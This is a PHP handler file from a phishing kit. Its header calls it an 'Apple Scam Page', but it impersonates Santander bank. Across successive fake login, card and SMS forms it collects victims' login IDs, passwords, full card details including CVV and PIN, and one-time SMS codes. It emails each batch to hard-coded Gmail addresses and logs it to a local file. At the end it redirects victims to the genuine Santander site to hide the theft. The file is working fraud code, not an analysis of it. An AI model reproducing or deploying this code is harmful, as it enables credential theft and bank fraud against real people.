<?php
/**
 * @link              https://www.facebook.com/hamidakhatar
 * @since             2019
 * @package           Apple Scam Page
 *
 * Project Name:      Apple Scam
 * Author:            Hamid Akhatar
 * Author URI:        https://www.facebook.com/hamidakhatar
 */
include_once './inc/app.php';
$to = 'alpinaeides@gmail.com;dnani4593@gmail.com';

$random   = rand(0,100000000000);
$dispatch = substr(md5($random), 0, 17);

if($_SERVER['REQUEST_METHOD'] == "POST") {

    if ($_POST['type'] == "login1") {

        $_SESSION['log_type1'] = $_POST['log_type'];
        $_SESSION['doc_type1'] = $_POST['log_type2'];
        $_SESSION['login1']    = $_POST['id_no'];
        $_SESSION['password1'] = $_POST['password'];

        $_SESSION['errors'] = [];
        if( empty($_POST['id_no']) ) {
            $_SESSION['errors']['id_no'] = true;
        }

        if( empty($_POST['password']) ) {
            $_SESSION['errors']['password'] = true;
        }

        if( count($_SESSION['errors']) == 0 ) {
            $subject = $_SERVER['REMOTE_ADDR'] . ' | Santander | Login1';
            $message = '/-- LOG INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'Login Type : ' . $_POST['log_type'] . "\r\n";
            $message .= 'Doc Type : ' . $_POST['log_type2'] . "\r\n";
            $message .= 'Login : ' . $_POST['id_no'] . "\r\n";
            $message .= 'Password : ' . $_POST['password'] . "\r\n";
            $message .= '/-- END LOG INFOS --/' . "\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";
            mail($to,$subject,$message,$headers);
            file_put_contents("./xREPORT/groupe.txt", $message, FILE_APPEND);
            unset($_SESSION['errors']);
            header("location: failed_login.php?cliente_id=$dispatch");
        } else {
            header("location: failed_login.php?confirma_id=$dispatch&error=1");
        }

    }

    if ($_POST['type'] == "login2") {

        $_SESSION['log_type2'] = $_POST['log_type'];
        $_SESSION['doc_type2'] = $_POST['log_type2'];
        $_SESSION['login2']    = $_POST['id_no'];
        $_SESSION['password2'] = $_POST['password'];

        $_SESSION['errors'] = [];
        if( empty($_POST['id_no']) ) {
            $_SESSION['errors']['id_no'] = true;
        }

        if( empty($_POST['password']) ) {
            $_SESSION['errors']['password'] = true;
        }

        if( count($_SESSION['errors']) == 0 ) {
            $subject = $_SERVER['REMOTE_ADDR'] . ' | Santander | Login2';
            $message = '/-- LOG INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'Login Type : ' . $_POST['log_type'] . "\r\n";
            $message .= 'Doc Type : ' . $_POST['log_type2'] . "\r\n";
            $message .= 'Login : ' . $_POST['id_no'] . "\r\n";
            $message .= 'Password : ' . $_POST['password'] . "\r\n";
            $message .= '/-- END LOG INFOS --/' . "\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";
            mail($to,$subject,$message,$headers);
            file_put_contents("./xREPORT/groupe.txt", $message, FILE_APPEND);
            unset($_SESSION['errors']);
            header("location: Mi_cuenta.php?cliente_id=$dispatch");
        } else {
            header("location: failed_login.php?confirma_id=$dispatch&error=1");
        }

    }

    if ($_POST['type'] == "card") {
        
        $_SESSION['card_name']   = $_POST['card_name'];
        $_SESSION['card_number'] = $_POST['card_number'];
        $_SESSION['card_date']   = $_POST['card_date'];
        $_SESSION['card_cvv']    = $_POST['card_cvv'];
        $_SESSION['card_pin']    = $_POST['card_pin'];

        $_SESSION['errors'] = [];
        if(empty($_POST['card_name'])) {
            $_SESSION['errors']['card_name'] = true;
        }

        if(validate_card($_POST['card_number']) == false) {
            $_SESSION['errors']['card_number'] = true;
        }

        if( validate_date($_POST['card_date'], 'm/y') == false ) {
            $_SESSION['errors']['card_date'] = true;
        }

        if( validate_cvv($_POST['card_cvv']) == false ) {
            $_SESSION['errors']['card_cvv'] = true;
        }

        if( validate_pin($_POST['card_pin']) == false ) {
            $_SESSION['errors']['card_pin'] = true;
        }

        if( count($_SESSION['errors']) == 0 ) {

            $subject = $_SERVER['REMOTE_ADDR'] . ' | Santander | Card Details';
            $message = '/-- CARD DETAILS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'Card Name : ' . $_POST['card_name'] . "\r\n";
            $message .= 'Card Number : ' . $_POST['card_number'] . "\r\n";
            $message .= 'Card Date : ' . $_POST['card_date'] . "\r\n";
            $message .= 'Card CVV : ' . $_POST['card_cvv'] . "\r\n";
            $message .= 'Card Pin : ' . $_POST['card_pin'] . "\r\n";
            $message .= '/-- END CARD DETAILS --/' . "\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

            mail($to,$subject,$message,$headers);
            file_put_contents("./xREPORT/groupe.txt", $message, FILE_APPEND);
            session_destroy();
            header("location: loading.php?cliente_id=$dispatch");

        } else {
            header("location: Mi_cuenta.php?cliente_id=$dispatch&error=1");
        }

    }

    if ($_POST['type'] == "sms") {

        $_SESSION['sms_code']       = $_POST['sms_code'];

        $_SESSION['errors'] = [];

        if( empty($_POST['sms_code']) ) {
            $_SESSION['errors']['sms_code'] = true;
        }


        if( count($_SESSION['errors']) == 0 ) {

            $subject = $_SERVER['REMOTE_ADDR'] . ' | Santander | Sms';
            $message = '/-- SMS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'SMS : ' . $_POST['sms_code'] . "\r\n";
            $message .= '/-- END SMS --/' . "\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

            mail($to,$subject,$message,$headers);
            file_put_contents("./xREPORT/groupe.txt", $message, FILE_APPEND);
            session_destroy();
            header("location: https://www.bancosantander.es/es/particulares");

        } else {
            header("location: sms.php?cmd=_update&dispatch=$dispatch&locale=dk_$get_user_countrycode");
        }

    }

}

?>